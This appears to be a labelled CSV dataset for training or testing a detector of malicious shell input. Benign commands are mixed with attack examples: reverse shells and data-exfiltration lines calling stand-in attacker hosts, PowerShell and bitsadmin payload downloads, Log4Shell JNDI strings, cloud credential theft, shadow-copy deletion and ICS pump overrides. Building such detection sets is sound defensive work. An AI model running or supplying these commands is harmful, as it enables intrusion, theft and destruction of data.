timestamp,src_ip,input,label
2026-01-20T18:06:49.582995,157.161.171.19,git pull,Normal_Business_Ops
2026-01-20T18:06:49.642230,169.52.119.8,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.615344,143.60.231.21,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.599537,215.64.93.18,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.585564,44.105.6.119,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.583995,103.198.154.235,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.601728,17.208.7.114,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.648870,151.35.139.121,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.605716,10.30.160.76,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.632463,208.66.150.105,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.588562,166.17.164.178,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.598537,124.18.242.98,git pull,Normal_Business_Ops
2026-01-20T18:06:49.605716,174.11.15.239,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.576929,1.100.50.105,make build,Normal_Business_Ops
2026-01-20T18:06:49.645823,215.93.213.112,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.633463,54.116.61.250,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.584995,180.144.0.125,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.616344,206.129.232.41,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.645823,186.124.184.39,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.643231,42.192.86.87,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.622713,56.75.236.145,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.608346,27.156.129.247,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.609343,25.113.148.5,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.618055,2.185.195.99,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.594923,209.11.77.196,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.578927,196.171.227.143,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.624262,110.130.137.205,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,212.174.70.63,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.581995,69.98.74.107,git branch,Normal_Business_Ops
2026-01-20T18:06:49.647820,108.244.116.56,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.596536,34.50.147.208,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.593923,69.162.160.177,whoami,Normal_Business_Ops
2026-01-20T18:06:49.623750,102.20.63.200,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,173.76.86.33,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.592206,103.141.145.208,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.652043,68.148.122.100,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.619742,44.147.241.177,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,14.227.142.192,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.627851,174.209.31.195,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.644231,163.18.26.47,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.637464,73.14.188.2,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.651526,99.208.225.103,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.626851,28.197.187.66,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.621712,173.41.167.177,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.576420,221.217.164.243,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.584995,194.232.221.196,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.655127,121.210.252.98,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.580022,37.62.218.230,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.655635,151.156.7.198,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.602715,218.203.159.68,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.656632,19.254.233.106,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.652043,170.107.244.66,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.592206,158.201.250.231,df -h,Normal_Business_Ops
2026-01-20T18:06:49.586561,92.120.23.53,git checkout -b feature-ai,Normal_Business_Ops
